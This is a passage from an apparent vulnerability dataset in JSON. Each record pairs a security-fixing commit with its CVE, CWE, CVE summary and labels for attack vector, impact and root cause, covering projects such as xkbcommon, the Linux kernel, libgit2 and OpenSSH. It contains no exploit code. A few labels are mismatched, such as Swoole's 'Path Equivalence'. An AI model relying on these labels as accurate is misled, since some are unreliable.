out-of-bounds uaccess in read handler in general , accessing userspace memory beyond the length of the supplied buffer in vfs read\/write handler can lead to both kernel memory corruption ( via kernel_read ( ) \/kernel_write ( ) , which can <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By sending a specially-crafted request","Impact":"crash the kernel or potentially escalate privileges","Root Cause":"caused by improper bounds checking","Attack Type":"local attacker"},{"commit_id":"5efe2947ab45e81d84b5f707c51d1c64be52f36c","cve_id":"CVE-2018-16253","cwe_id":"CWE-347","commit_message":"Apply CVE fixes for X509 parsing\n\nApply patches developed by Sze Yiu which correct a vulnerability in\nX509 parsing.  See CVE-2018-16150 and CVE-2018-16149 for more info.","summary":"In sig_verify() in x509.c in axTLS version 2.1.3 and before, the PKCS#1 v1.5 signature verification does not properly verify the ASN.1 metadata. Consequently, a remote attacker can forge signatures when small public exponents are being used, which could lead to impersonation through fake X.509 certificates. This is an even more permissive variant of CVE-2006-4790 and CVE-2014-1568.","commit_message_1":"apply cve fix for x509 parsing apply patch developed by sze yiu which correct a vulnerability in x509 parsing","Vulnerability Type":"Improper Verification of Cryptographic Signature","Attack Vector":"By using specially-crafted X.509 certificates","Impact":"bypass access restrictions","Root Cause":"caused by the failure to properly verify the ASN.1 metadata","Attack Type":"remote attacker"},{"commit_id":"96df3106d49438e442510c59acad306e94f3db4d","cve_id":"CVE-2018-15863","cwe_id":"CWE-476","commit_message":"xkbcomp: Don't crash on no-op modmask expressions\n\nIf we have an expression of the form 'l1' in an interp section, we\nunconditionally try to dereference its args, even if it has none.\n\nSigned-off-by: Daniel Stone <daniels@collabora.com>","summary":"Unchecked NULL pointer usage in ResolveStateAndPredicate in xkbcomp\/compat.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file with a no-op modmask expression.","commit_message_1":"do n't crash on no-op modmask expression if we have an expression of the form 'l1 ' in an interp section , we unconditionally try to dereference it args , even if it ha none","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"4e2ee9c3f6050d773f8bbe05bc0edb17f1ff8371","cve_id":"CVE-2018-15862","cwe_id":"CWE-476","commit_message":"xkbcomp: Don't explode on invalid virtual modifiers\n\ntestcase: 'virtualModifiers=LevelThreC'\n\nSigned-off-by: Daniel Stone <daniels@collabora.com>","summary":"Unchecked NULL pointer usage in LookupModMask in xkbcomp\/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file with invalid virtual modifiers.","commit_message_1":"xkbcomp : do n't explode on invalid virtual modifier","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by supplying a crafted keymap file with invalid virtual modifiers","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"38e1766bc6e20108948aec8a0b222a4bad0254e9","cve_id":"CVE-2018-15861","cwe_id":"CWE-476","commit_message":"xkbcomp: Don't falsely promise from ExprResolveLhs\n\nEvery user of ExprReturnLhs goes on to unconditionally dereference the\nfield return, which can be NULL if xkb_intern_atom fails. Return false\nif this is the case, so we fail safely.\n\ntestcase: splice geometry data into interp\n\nSigned-off-by: Daniel Stone <daniels@collabora.com>","summary":"Unchecked NULL pointer usage in ExprResolveLhs in xkbcomp\/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file that triggers an xkb_intern_atom failure.","commit_message_1":"do n't falsely promise from exprresolvelhs every user of exprreturnlhs go on to unconditionally dereference the field return , which can be null if xkb_intern_atom fails","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by supplying a crafted keymap file that triggers an xkb _ intern _ atom failure","Impact":"crash ( pointer dereference ) the xkbcommon parser","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"bb4909d2d8fa6b08155e449986a478101e2b2634","cve_id":"CVE-2018-15859","cwe_id":"CWE-476","commit_message":"Fail expression lookup on invalid atoms\n\nIf we fail atom lookup, then we should not claim that we successfully\nlooked up the expression.\n\nSigned-off-by: Daniel Stone <daniels@collabora.com>","summary":"Unchecked NULL pointer usage when parsing invalid atoms in ExprResolveLhs in xkbcomp\/expr.c in xkbcommon before 0.8.2 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file, because lookup failures are mishandled.","commit_message_1":"fail expression lookup on invalid atom if we fail atom lookup , then we should not claim that we successfully looked up the expression","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"crash ( pointer dereference ) the xkbcommon parser by supplying","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"badb428e63387140720f22486b3acbd3d738859f","cve_id":"CVE-2018-15858","cwe_id":"CWE-476","commit_message":"keycodes: don't try to copy zero key aliases\n\nMove the aliases copy to within the (num_key_aliases > 0) block.\n\nPassing info->aliases into this fuction with invalid aliases will\ncause log messages but num_key_aliases stays on 0. The key_aliases array\nis never allocated and remains NULL. We then loop through the aliases, causing\na null-pointer dereference.\n\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>","summary":"Unchecked NULL pointer usage when handling invalid aliases in CopyKeyAliasesToKeymap in xkbcomp\/keycodes.c in xkbcommon before 0.8.1 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file.","commit_message_1":"do n't try to copy zero key alias move the alias copy to within the ( num_key_aliases > <number> ) block","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by supplying a crafted keymap file","Impact":"crash ( pointer dereference ) the xkbcommon parser","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"c1e5ac16e77a21f87bdf3bc4dea61b037a17dddb","cve_id":"CVE-2018-15857","cwe_id":"CWE-416","commit_message":"xkbcomp: fix pointer value for FreeStmt\n\nSigned-off-by: Peter Hutterer <peter.hutterer@who-t.net>","summary":"An invalid free in ExprAppendMultiKeysymList in xkbcomp\/ast-build.c in xkbcommon before 0.8.1 could be used by local attackers to crash xkbcommon keymap parsers or possibly have unspecified other impact by supplying a crafted keymap file.","commit_message_1":"xkbcomp : fix pointer value for freestmt","Vulnerability Type":"Use After Free","Attack Vector":"by supplying a crafted keymap file","Impact":"crash xkbcommon keymap parsers or possibly have unspecified other impact","Root Cause":"caused by an invalid free","Attack Type":"local attacker"},{"commit_id":"842e4351c2c97de6051cab6ce36b4a81e709a0e1","cve_id":"CVE-2018-15856","cwe_id":"CWE-835","commit_message":"compose: fix infinite loop in parser on some inputs\n\nThe parser would enter an infinite loop if an unterminated keysym\nliteral occurs at EOF.\n\nFound with the afl fuzzer.\n\nSigned-off-by: Ran Benita <ran234@gmail.com>","summary":"An infinite loop when reaching EOL unexpectedly in compose\/parser.c (aka the keymap parser) in xkbcommon before 0.8.1 could be used by local attackers to cause a denial of service during parsing of crafted keymap files.","commit_message_1":"fix infinite loop in parser on some input the parser would enter an infinite loop if an unterminated keysym literal occurs at eof","Vulnerability Type":"Infinite Loop","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an infinite loop","Attack Type":"local attacker"},{"commit_id":"917636b1d0d70205a13f89062b95e3a0fc31d4ff","cve_id":"CVE-2018-15855","cwe_id":"CWE-476","commit_message":"xkbcomp: fix crash when parsing an xkb_geometry section\n\nxkb_geometry sections are ignored; previously the had done so by\nreturning NULL for the section's XkbFile, however some sections of the\ncode do not expect this. Instead, create an XkbFile for it, it will\nnever be processes and discarded later.\n\nCaught with the afl fuzzer.\n\nSigned-off-by: Ran Benita <ran234@gmail.com>","summary":"Unchecked NULL pointer usage in xkbcommon before 0.8.1 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file, because the XkbFile for an xkb_geometry section was mishandled.","commit_message_1":"fix crash when parsing an xkb_geometry section xkb_geometry section are ignored ; previously the had done so by returning null for the section 's xkbfile , however some section of the code do not expect this","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by supplying a crafted keymap file , because the xkbfile for an xkb _ geometry section was mishandled","Impact":"crash ( pointer dereference ) the xkbcommon parser","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"e3cacae7b1bfda0d839c280494f23284a1187adf","cve_id":"CVE-2018-15854","cwe_id":"CWE-476","commit_message":"xkbcomp: fix crashes in the parser when geometry tokens appear\n\nIn the XKB format, floats and various keywords can only be used in the\nxkb_geometry section. xkbcommon removed support xkb_geometry, but still\nparses it for backward compatibility. As part of ignoring it, the float\nAST node and various keywords were removed, and instead NULL was\nreturned by their parsing actions. However, the rest of the code does\nnot handle NULLs, and so when they appear crashes usually ensue.\n\nTo fix this, restore the float AST node and the ignored keywords. None\nof the evaluating code expects them, so nice error are displayed.\n\nCaught with the afl fuzzer.\n\nSigned-off-by: Ran Benita <ran234@gmail.com>","summary":"Unchecked NULL pointer usage in xkbcommon before 0.8.1 could be used by local attackers to crash (NULL pointer dereference) the xkbcommon parser by supplying a crafted keymap file, because geometry tokens were desupported incorrectly.","commit_message_1":"fix crash in the parser when geometry token appear in the xkb format , float and various keywords can only be used in the xkb_geometry section","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by supplying a crafted keymap file , because geometry tokens were desupported incorrectly","Impact":"crash ( pointer dereference ) the xkbcommon parser","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"1f9d1248c07cda8aaff762429c0dce146de8632a","cve_id":"CVE-2018-15853","cwe_id":"CWE-400","commit_message":"xkbcomp: fix stack overflow when evaluating boolean negation\n\nThe expression evaluator would go into an infinite recursion when\nevaluating something like this as a boolean: `!True`. Instead of\nrecursing to just `True` and negating, it recursed to `!True` itself\nagain.\n\nBug inherited from xkbcomp.\n\nCaught with the afl fuzzer.\n\nSigned-off-by: Ran Benita <ran234@gmail.com>","summary":"Endless recursion exists in xkbcomp\/expr.c in xkbcommon and libxkbcommon before 0.8.1, which could be used by local attackers to crash xkbcommon users by supplying a crafted keymap file that triggers boolean negation.","commit_message_1":"fix stack overflow when evaluating boolean negation the expression evaluator would go into an infinite recursion when evaluating something like this a a boolean : ` ! true `","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"by supplying a crafted keymap file that triggers boolean negation .","Impact":"cause a denial of service","Root Cause":"caused by an endless recursion","Attack Type":"local attacker"},{"commit_id":"9eaa6c2a823c1d2b58913506a15f9474bf857a3d","cve_id":"CVE-2018-15836","cwe_id":"CWE-347","commit_message":"wo#7449 . verify padding contents for IKEv2 RSA sig check\n\nSpecial thanks to Sze Yiu Chau of Purdue University (schau@purdue.edu)\nwho reported the issue.","summary":"In verify_signed_hash() in lib\/liboswkeys\/signatures.c in Openswan before 2.6.50.1, the RSA implementation does not verify the value of padding string during PKCS#1 v1.5 signature verification. Consequently, a remote attacker can forge signatures when small public exponents are being used. IKEv2 signature verification is affected when RAW RSA keys are used.","commit_message_1":"wo # <number>","Vulnerability Type":"Improper Verification of Cryptographic Signature","Attack Vector":"verify the value of padding string by the verify_signed_hash() in lib\/liboswkeys\/signatures.c","Impact":"forge signatures","Root Cause":"does not verify the value of padding string during pkcs # 1 v1 . 5 signature verification . consequently","Attack Type":"remote attacker"},{"commit_id":"6b67d7f05918f7a1ee8fc6ff21355d7e8736aa10","cve_id":"CVE-2018-15822","cwe_id":"CWE-617","commit_message":"avformat\/flvenc: Check audio packet size\n\nFixes: Assertion failure\nFixes: assert_flvenc.c:941_1.swf\n\nFound-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg>\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>","summary":"The flv_write_packet function in libavformat\/flvenc.c in FFmpeg through 4.0.2 does not check for an empty audio packet, leading to an assertion failure.","commit_message_1":"avformat\/flvenc : check audio packet size","Vulnerability Type":"Reachable Assertion","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"5800dc5c19f34e6e03b5adab1282535cb102fafd","cve_id":"CVE-2018-15594","cwe_id":"CWE-200","commit_message":"x86\/paravirt: Fix spectre-v2 mitigations for paravirt guests\n\nNadav reported that on guests we're failing to rewrite the indirect\ncalls to CALLEE_SAVE paravirt functions. In particular the\npv_queued_spin_unlock() call is left unpatched and that is all over the\nplace. This obviously wrecks Spectre-v2 mitigation (for paravirt\nguests) which relies on not actually having indirect calls around.\n\nThe reason is an incorrect clobber test in paravirt_patch_call(); this\nfunction rewrites an indirect call with a direct call to the _SAME_\nfunction, there is no possible way the clobbers can be different\nbecause of this.\n\nTherefore remove this clobber check. Also put WARNs on the other patch\nfailure case (not enough room for the instruction) which I've not seen\ntrigger in my (limited) testing.\n\nThree live kernel image disassemblies for lock_sock_nested (as a small\nfunction that illustrates the problem nicely). PRE is the current\nsituation for guests, POST is with this patch applied and NATIVE is with\nor without the patch for !guests.\n\nPRE:\n\n(gdb) disassemble lock_sock_nested\nDump of assembler code for function lock_sock_nested:\n   0xffffffff817be970 <+0>:     push   %rbp\n   0xffffffff817be971 <+1>:     mov    %rdi,%rbp\n   0xffffffff817be974 <+4>:     push   %rbx\n   0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx\n   0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>\n   0xffffffff817be981 <+17>:    mov    %rbx,%rdi\n   0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>\n   0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax\n   0xffffffff817be98f <+31>:    test   %eax,%eax\n   0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>\n   0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)\n   0xffffffff817be99d <+45>:    mov    %rbx,%rdi\n   0xffffffff817be9a0 <+48>:    callq  *0xffffffff822299e8\n   0xffffffff817be9a7 <+55>:    pop    %rbx\n   0xffffffff817be9a8 <+56>:    pop    %rbp\n   0xffffffff817be9a9 <+57>:    mov    $0x200,%esi\n   0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi\n   0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063ae0 <__local_bh_enable_ip>\n   0xffffffff817be9ba <+74>:    mov    %rbp,%rdi\n   0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>\n   0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35>\nEnd of assembler dump.\n\nPOST:\n\n(gdb) disassemble lock_sock_nested\nDump of assembler code for function lock_sock_nested:\n   0xffffffff817be970 <+0>:     push   %rbp\n   0xffffffff817be971 <+1>:     mov    %rdi,%rbp\n   0xffffffff817be974 <+4>:     push   %rbx\n   0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx\n   0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>\n   0xffffffff817be981 <+17>:    mov    %rbx,%rdi\n   0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>\n   0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax\n   0xffffffff817be98f <+31>:    test   %eax,%eax\n   0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>\n   0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)\n   0xffffffff817be99d <+45>:    mov    %rbx,%rdi\n   0xffffffff817be9a0 <+48>:    callq  0xffffffff810a0c20 <__raw_callee_save___pv_queued_spin_unlock>\n   0xffffffff817be9a5 <+53>:    xchg   %ax,%ax\n   0xffffffff817be9a7 <+55>:    pop    %rbx\n   0xffffffff817be9a8 <+56>:    pop    %rbp\n   0xffffffff817be9a9 <+57>:    mov    $0x200,%esi\n   0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi\n   0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063aa0 <__local_bh_enable_ip>\n   0xffffffff817be9ba <+74>:    mov    %rbp,%rdi\n   0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>\n   0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35>\nEnd of assembler dump.\n\nNATIVE:\n\n(gdb) disassemble lock_sock_nested\nDump of assembler code for function lock_sock_nested:\n   0xffffffff817be970 <+0>:     push   %rbp\n   0xffffffff817be971 <+1>:     mov    %rdi,%rbp\n   0xffffffff817be974 <+4>:     push   %rbx\n   0xffffffff817be975 <+5>:     lea    0x88(%rbp),%rbx\n   0xffffffff817be97c <+12>:    callq  0xffffffff819f7160 <_cond_resched>\n   0xffffffff817be981 <+17>:    mov    %rbx,%rdi\n   0xffffffff817be984 <+20>:    callq  0xffffffff819fbb00 <_raw_spin_lock_bh>\n   0xffffffff817be989 <+25>:    mov    0x8c(%rbp),%eax\n   0xffffffff817be98f <+31>:    test   %eax,%eax\n   0xffffffff817be991 <+33>:    jne    0xffffffff817be9ba <lock_sock_nested+74>\n   0xffffffff817be993 <+35>:    movl   $0x1,0x8c(%rbp)\n   0xffffffff817be99d <+45>:    mov    %rbx,%rdi\n   0xffffffff817be9a0 <+48>:    movb   $0x0,(%rdi)\n   0xffffffff817be9a3 <+51>:    nopl   0x0(%rax)\n   0xffffffff817be9a7 <+55>:    pop    %rbx\n   0xffffffff817be9a8 <+56>:    pop    %rbp\n   0xffffffff817be9a9 <+57>:    mov    $0x200,%esi\n   0xffffffff817be9ae <+62>:    mov    $0xffffffff817be993,%rdi\n   0xffffffff817be9b5 <+69>:    jmpq   0xffffffff81063ae0 <__local_bh_enable_ip>\n   0xffffffff817be9ba <+74>:    mov    %rbp,%rdi\n   0xffffffff817be9bd <+77>:    callq  0xffffffff817be8c0 <__lock_sock>\n   0xffffffff817be9c2 <+82>:    jmp    0xffffffff817be993 <lock_sock_nested+35>\nEnd of assembler dump.\n\n\nFixes: 63f70270ccd9 (\"[PATCH] i386: PARAVIRT: add common patching machinery\")\nFixes: 3010a0663fd9 (\"x86\/paravirt, objtool: Annotate indirect calls\")\nReported-by: Nadav Amit <namit@vmware.com>\nSigned-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nReviewed-by: Juergen Gross <jgross@suse.com>\nCc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: Boris Ostrovsky <boris.ostrovsky@oracle.com>\nCc: David Woodhouse <dwmw2@infradead.org>\nCc: stable@vger.kernel.org","summary":"arch\/x86\/kernel\/paravirt.c in the Linux kernel before 4.18.1 mishandles certain indirect calls, which makes it easier for attackers to conduct Spectre-v2 attacks against paravirtual guests.","commit_message_1":"fix spectre-v2 mitigation for paravirt guest nadav reported that on guest we 're failing to rewrite the indirect call to callee_save paravirt function","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By conducting Spectre-v2 attacks against paravirtual guests","Impact":"obtain sensitive information","Root Cause":"caused by the improper handling of certain indirect calls","Attack Type":"local attacker"},{"commit_id":"fdf82a7856b32d905c39afc85e34364491e46346","cve_id":"CVE-2018-15572","cwe_id":null,"commit_message":"x86\/speculation: Protect against userspace-userspace spectreRSB\n\nThe article \"Spectre Returns! Speculation Attacks using the Return Stack \nBuffer\" [1] describes two new (sub-)variants of spectrev2-like attacks, \nmaking use solely of the RSB contents even on CPUs that don't fallback to \nBTB on RSB underflow (Skylake+).\n\nMitigate userspace-userspace attacks by always unconditionally filling RSB on\ncontext switch when the generic spectrev2 mitigation has been enabled.\n\n[1] https:\/\/arxiv.org\/pdf\/1807.07940.pdf\n\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>\nReviewed-by: Josh Poimboeuf <jpoimboe@redhat.com>\nAcked-by: Tim Chen <tim.c.chen@linux.intel.com>\nCc: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com>\nCc: Borislav Petkov <bp@suse.de>\nCc: David Woodhouse <dwmw@amazon.co.uk>\nCc: Peter Zijlstra <peterz@infradead.org>\nCc: Linus Torvalds <torvalds@linux-foundation.org>\nCc: stable@vger.kernel.org\nLink: https:\/\/lkml.kernel.org\/r\/nycvar.YFH.7.76.1807261308190.997@cbobk.fhfr.pm","summary":"The spectre_v2_select_mitigation function in arch\/x86\/kernel\/cpu\/bugs.c in the Linux kernel before 4.18.1 does not always fill RSB upon a context switch, which makes it easier for attackers to conduct userspace-userspace spectreRSB attacks.","commit_message_1":"protect against userspace-userspace spectrersb the article `` spectre return ! speculation attack using the return stack buffer '' [ <number> ] describes two new ( sub- ) variant of spectrev2-like attack , making use solely of the rsb content even on cpu that do n't fallback to btb on rsb underflow ( skylake+ )","Vulnerability Type":"unspecified","Attack Vector":"upon a context switch","Impact":"conduct userspace - userspace spectrersb attacks","Root Cause":"does not always fill rsb upon a context switch","Attack Type":"local attacker"},{"commit_id":"4cdbce5d9bf2fe596bb6acd7d6611f9e8c253a76","cve_id":"CVE-2018-15503","cwe_id":"CWE-502","commit_message":"add buffer end check","summary":"The unpack implementation in Swoole version 4.0.4 lacks correct size checks in the deserialization process. An attacker can craft a serialized object to exploit this vulnerability and cause a SEGV.","commit_message_1":"add buffer end check","Vulnerability Type":"Path Equivalence","Attack Vector":"by using a specially crafted serialized object","Impact":"cause a SEGV","Root Cause":"lacks correct size checks","Attack Type":"remote attacker"},{"commit_id":"1f9a8510e1d2f20ed7334eeeddb92c4dd8e7c649","cve_id":"CVE-2018-15501","cwe_id":"CWE-125","commit_message":"smart_pkt: fix potential OOB-read when processing ng packet\n\nOSS-fuzz has reported a potential out-of-bounds read when processing a\n\"ng\" smart packet:\n\n==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6310000249c0 at pc 0x000000493a92 bp 0x7ffddc882cd0 sp 0x7ffddc882480\n\tREAD of size 65529 at 0x6310000249c0 thread T0\n\tSCARINESS: 26 (multi-byte-read-heap-buffer-overflow)\n\t#0 0x493a91 in __interceptor_strchr.part.35 \/src\/llvm\/projects\/compiler-rt\/lib\/sanitizer_common\/sanitizer_common_interceptors.inc:673\n\t#1 0x813960 in ng_pkt libgit2\/src\/transports\/smart_pkt.c:320:14\n\t#2 0x810f79 in git_pkt_parse_line libgit2\/src\/transports\/smart_pkt.c:478:9\n\t#3 0x82c3c9 in git_smart__store_refs libgit2\/src\/transports\/smart_protocol.c:47:12\n\t#4 0x6373a2 in git_smart__connect libgit2\/src\/transports\/smart.c:251:15\n\t#5 0x57688f in git_remote_connect libgit2\/src\/remote.c:708:15\n\t#6 0x52e59b in LLVMFuzzerTestOneInput \/src\/download_refs_fuzzer.cc:145:9\n\t#7 0x52ef3f in ExecuteFilesOnyByOne(int, char**) \/src\/libfuzzer\/afl\/afl_driver.cpp:301:5\n\t#8 0x52f4ee in main \/src\/libfuzzer\/afl\/afl_driver.cpp:339:12\n\t#9 0x7f6c910db82f in __libc_start_main \/build\/glibc-Cl5G7W\/glibc-2.23\/csu\/libc-start.c:291\n\t#10 0x41d518 in _start\n\nWhen parsing an \"ng\" packet, we keep track of both the current position\nas well as the remaining length of the packet itself. But instead of\ntaking care not to exceed the length, we pass the current pointer's\nposition to `strchr`, which will search for a certain character until\nhitting NUL. It is thus possible to create a crafted packet which\ndoesn't contain a NUL byte to trigger an out-of-bounds read.\n\nFix the issue by instead using `memchr`, passing the remaining length as\nrestriction. Furthermore, verify that we actually have enough bytes left\nto produce a match at all.\n\nOSS-Fuzz-Issue: 9406","summary":"In ng_pkt in transports\/smart_pkt.c in libgit2 before 0.26.6 and 0.27.x before 0.27.4, a remote attacker can send a crafted smart-protocol *ng* packet that lacks a '0' byte to trigger an out-of-bounds read that leads to DoS.","commit_message_1":"fix potential oob-read when processing ng packet oss-fuzz ha reported a potential out-of-bounds read when processing a `` ng '' smart packet : ==<number>==error : addresssanitizer : heap-buffer-overflow on address 0x6310000249c0 at pc 0x000000493a92 bp 0x7ffddc882cd0 sp 0x7ffddc882480 read of size <number> at 0x6310000249c0 thread t0 scariness : <number> ( multi-byte-read-heap-buffer-overflow ) # <number> 0x493a91 in <file>","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted packet","Impact":"cause a denial of service","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"779974d35b4859c07bc3cb8a12c74b43b0a7d1e0","cve_id":"CVE-2018-15473","cwe_id":"CWE-200","commit_message":"delay bailout for invalid authenticating user until after the packet\ncontaining the request has been fully parsed. Reported by Dariusz Tytko\nand Micha\u0142 Sajdak; ok deraadt","summary":"OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.","commit_message_1":"delay bailout for invalid authenticating user until after the packet containing the request ha been fully parsed","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By sending a specially crafted request","Impact":"obtain sensitive information","Root Cause":"caused by different responses to valid and invalid authentication attempts","Attack Type":"remote attacker"},{"commit_id":"71aaeaf020340412b8d012fe23a556c0420eda5f","cve_id":"CVE-2018-15120","cwe_id":"CWE-119","commit_message":"Prevent an assertion with invalid Unicode sequences\n\nInvalid Unicode sequences, such as 0x2665 0xfe0e 0xfe0f,\ncan trick the Emoji iter code into returning an empty\nsegment, which then triggers an assertion in the itemizer.\n\nPrevent this by ensuring that we make progress.\n\nThis issue was reported by Jeffrey M.","summary":"libpango in Pango 1.40.8 through 1.42.3, as used in hexchat and other products, allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via crafted text with invalid Unicode sequences.","commit_message_1":"prevent an assertion with invalid unicode sequence invalid unicode sequence , such a 0x2665 0xfe0e 0xfe0f , can trick the emoji iter code into returning an empty segment , which then trigger an assertion in the itemizer","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted text with invalid unicode sequences ","Impact":"cause a denial of service ( application crash ) or possibly have unspecified other impact","Root Cause":"By using a specially-crafted text","Attack Type":"remote attacker"},{"commit_id":"a4e1cd14eb5ccc51ed271b65b3420f7d692c40eb","cve_id":"CVE-2018-14938","cwe_id":"CWE-125","commit_message":"fixed buffer overflow","summary":"An issue was discovered in wifipcap\/wifipcap.cpp in TCPFLOW through 1.5.0-alpha. There is an integer overflow in the function handle_prism during caplen processing. If the caplen is less than 144, one can cause an integer overflow in the function handle_80211, which will result in an out-of-bounds read and may allow access to sensitive memory (or a denial of service).","commit_message_1":"fixed buffer overflow","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By sending a specially-crafted request","Impact":"obtain sensitive information","Root Cause":"caused by an integer overflow flaw","Attack Type":"remote attacker"},{"commit_id":"cb2595c1393b4a5211534e6f0a0fbad369e21ad8","cve_id":"CVE-2018-14734","cwe_id":"CWE-416","commit_message":"infiniband: fix a possible use-after-free bug\n\nucma_process_join() will free the new allocated \"mc\" struct,\nif there is any error after that, especially the copy_to_user().\n\nBut in parallel, ucma_leave_multicast() could find this \"mc\"\nthrough idr_find() before ucma_process_join() frees it, since it\nis already published.\n\nSo \"mc\" could be used in ucma_leave_multicast() after it is been\nallocated and freed in ucma_process_join(), since we don't refcnt\nit.\n\nFix this by separating \"publish\" from ID allocation, so that we\ncan get an ID first and publish it later after copy_to_user().\n\nFixes: c8f6a362bf3e (\"RDMA\/cma: Add multicast communication support\")\nReported-by: Noam Rathaus <noamr@beyondsecurity.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nSigned-off-by: Jason Gunthorpe <jgg@mellanox.com>","summary":"drivers\/infiniband\/core\/ucma.c in the Linux kernel through 4.17.11 allows ucma_leave_multicast to access a certain data structure after a cleanup step in ucma_process_join, which allows attackers to cause a denial of service (use-after-free).","commit_message_1":"fix a possible use-after-free bug ucma_process_join ( ) will free the new allocated `` mc '' struct , if there is any error after that , especially the copy_to_user ( )","Vulnerability Type":"Use After Free","Attack Vector":"By sending a specially-crafted request","Impact":"cause a denial of service","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"0b0ef9344255ff5acfac6b7af09198ac9c9756c8","cve_id":"CVE-2018-14681","cwe_id":"CWE-787","commit_message":"kwaj_read_headers(): fix handling of non-terminated strings","summary":"An issue was discovered in kwajd_read_headers in mspack\/kwajd.c in libmspack before 0.7alpha. Bad KWAJ file header extensions could cause a one or two byte overwrite.","commit_message_1":"kwaj_read_headers ( ) : fix handling of non-terminated string","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"using bad KWAJ file header extensions","Impact":"cause a one or two byte overwrite","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"72e70a921f0f07fee748aec2274b30784e1d312a","cve_id":"CVE-2018-14680","cwe_id":"CWE-20","commit_message":"Fix off-by-one bounds check on CHM PMGI\/PMGL chunk numbers and\nreject empty filenames. Thanks to Hanno B\u00f6ck for reporting","summary":"An issue was discovered in mspack\/chmd.c in libmspack before 0.7alpha. It does not reject blank CHM filenames.","commit_message_1":"fix off-by-one bound check on chm pmgi\/pmgl chunk number and reject empty filename","Vulnerability Type":"Improper Input Validation","Attack Vector":"has an unknown attack vector","Impact":"has an unknown impact","Root Cause":"the failure to reject blank CHM filenames","Attack Type":"local attacker"},{"commit_id":"fa19fbcf712a6a6cc5a5cfdc3254a97b9bce6582","cve_id":"CVE-2018-14395","cwe_id":"CWE-369","commit_message":"avformat\/movenc: Write version 2 of audio atom if channels is not known\n\nThe version 1 needs the channel count and would divide by 0\nFixes: division by 